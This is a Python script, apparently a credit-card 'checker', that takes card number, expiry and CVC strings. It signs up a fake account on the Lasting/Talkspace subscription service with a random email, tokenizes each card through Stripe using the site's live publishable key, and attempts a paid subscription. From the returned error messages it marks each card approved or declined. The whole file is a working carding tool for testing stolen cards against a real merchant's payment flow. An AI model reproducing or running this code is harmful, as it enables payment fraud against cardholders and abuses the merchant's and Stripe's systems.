import requests,random,string

def rr(length):
    letters = string.ascii_letters + string.digits
    return  ''.join(random.choice(letters) for i in range(length))




def main(ccsa):
    try:
        
        
        ccs = ccsa.split('|')
        seesion = requests.Session()
        json_data = {'user': {'email': f'{rr(8)}@gmail.com','password': 'zdrNc1',},}
        response = seesion.post('https://lasting-api.talkspace.com/api/v1/users', json=json_data)
        token = response.json()['jwt']
        
        data = f'card[number]={ccs[0]}&card[cvc]={ccs[3]}&card[exp_month]={ccs[1]}&card[exp_year]={ccs[2]}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F213f5d754b%3B+stripe-js-v3%2F213f5d754b&time_on_page=69987&key=pk_live_0dKqmbrnO3aTYXiPjHukEqH8&pasted_fields=number'
        respona = seesion.post('https://api.stripe.com/v1/tokens', data=data)
        
        if 'error' in respona.text: 
            if "Your card's security code is invalid." in respona.text:return 'Aproved! ✅',respona.json()['error']['message']+'( '+respona.json()['error']['code']+' )'
            else:return 'Decline! ❌',respona.json()['error']['message']
        else:
            
            idw = respona.json()['id']
            
            headers = {'authority': 'lasting-api.talkspace.com','accept': 'application/json, text/plain, */*','accept-language': 'en-US,en;q=0.9','authorization': token,'content-type': 'application/json','origin': 'https://app.getlasting.com','referer': 'https://app.getlasting.com/','sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',}
            json_data = {'stripe_token': idw,'subscription_type': '3999-one-month-with-trial',}
            response = requests.post('https://lasting-api.talkspace.com/api/v1/ecommerce/subscribe', headers=headers, json=json_data)
            
            if "Your card's security code is incorrect." in response.text:return 'Aproved! ✅',response.json()['errors'][0]
            elif '{"errors":["' in response.text: return 'Decline ❌',response.json()['errors'][0]
            else:return 'Aproved! ✅','Aproved! (AUTH) ✅'
            

    except:return 'Decline ❌','Request Failed.'


